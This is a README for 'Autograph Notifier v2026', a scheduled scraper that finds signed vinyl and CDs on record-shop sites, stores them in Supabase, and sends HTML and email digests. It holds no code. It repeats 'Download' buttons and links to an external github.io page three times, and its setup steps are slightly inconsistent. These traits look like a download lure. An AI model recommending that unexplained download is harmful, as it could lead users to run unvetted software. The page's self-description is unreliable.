# Autograph Notifier v2026 - web scraper 2026

> **Find newly listed signed music collectibles and turn them into an easy-to-browse update feed.** Autograph Notifier watches record shops and online music retailers for signed vinyl, CDs, and related collectible items. The v2026 release supports scheduled runs, Supabase storage, generated HTML pages, and email digests.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattgreentczl6344/autograph-notifier-2026?style=flat-square)](https://github.com/mattgreentczl6344/autograph-notifier-2026)

---

<p align="center">
  <a href="https://mattgreentczl6344.github.io/autograph-notifier-2026/">
    <img src="https://img.shields.io/badge/Download-Autograph%20Notifier%20Latest-brightgreen?style=for-the-badge" alt="Download Autograph Notifier">
  </a>
</p>

> **[Download Autograph Notifier v2026](https://mattgreentczl6344.github.io/autograph-notifier-2026/)**

---

[Download Latest Build](https://mattgreentczl6344.github.io/autograph-notifier-2026/)

---

## What Autograph Notifier Does

Autograph Notifier gives collectors a single place to follow newly available signed music from independent record stores and online shops. It searches configured sources for autograph-related listings, signed vinyl, CDs, and other collectible formats, then organizes matching products into a feed that is more practical to monitor than visiting every shop individually.

The scraper is intended for ongoing, scheduled discovery rather than isolated searches. It checks sources repeatedly, filters out duplicate listings, saves matching records in Supabase, and makes the latest information available through generated HTML index pages and email updates.

---

## Highlights

- Checks online record shops for newly posted products
- Identifies listings associated with autographs and signed merchandise
- Searches collectible music formats including vinyl and CDs
- Filters duplicate entries before they are published
- Persists discovered listings in Supabase
- Delivers daily email summaries of new matches
- Produces HTML index pages for browsing results
- Supports automated, scheduled execution

---

## Getting Started

Set up the project files and prepare the runtime used by your chosen deployment arrangement.

1. Clone or download the repository:
   - `git clone https://github.com/mattgreentczl6344/autograph-notifier-2026.git
2. Enter the application directory:
   - `cd autographNotifier`
3. Add the required Supabase and email configuration.
4. Launch the scraper or scheduler using the commands and process model provided by your hosting environment.

For a static hosting workflow, publish the generated HTML files once the first crawl has finished.

---

## Typical Workflow

Autograph Notifier can be used as a recurring pipeline:

1. Start the scraper through a scheduled job.
2. Retrieve current listings from the configured record shops.
3. Write only unique discoveries to Supabase.
4. Build the HTML index pages from the collected data.
5. Email the daily summary to the configured recipient.

A normal operating cycle may include:

- Starting the scheduled task
- Browsing the newly generated listing pages
- Reviewing the email digest for fresh matches
- Updating source targets or filters when necessary

---

## Settings

Project environment variables and deployment settings hold the values used by the scraper and its delivery process.

Typical configuration covers:

- Supabase connection information
- SMTP and email delivery details
- Record shop sources to monitor
- The interval or timing for scheduled runs
- The destination for generated HTML files

Example environment layout:

    SUPABASE_URL=
    SUPABASE_KEY=
    EMAIL_SMTP_HOST=
    EMAIL_SMTP_PORT=
    EMAIL_FROM=
    EMAIL_TO=
    SCRAPE_INTERVAL=

---

## System Requirements

To operate the project, you need:

- A web runtime or hosting service that can execute scheduled jobs
- A Supabase account or project for storing results
- An email provider or SMTP credentials for digest delivery
- A storage location or deployment destination for generated HTML pages
- Network connectivity to the record shop sources being scraped

---

## Frequently Asked Questions

**Where can I view the scraper's findings?**  
Results are stored in Supabase, included in generated HTML pages, and delivered as daily email digests.

**Can the monitored shops be changed?**  
Yes. Configure the source targets through the project's deployment and configuration settings.

**What should I inspect when something is not working?**  
Start by checking the scheduler, Supabase credentials, and email configuration. If the pages are missing, verify that the HTML output is being created and published to the intended location.

**Is the scraper continuously running?**  
The project is built for scheduled execution. The actual frequency is determined by the job runner or hosting environment configuration.

**Which products are included?**  
It targets autograph-related music listings, especially signed vinyl and CDs offered by record stores and comparable online shops.

---

## License

Licensed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
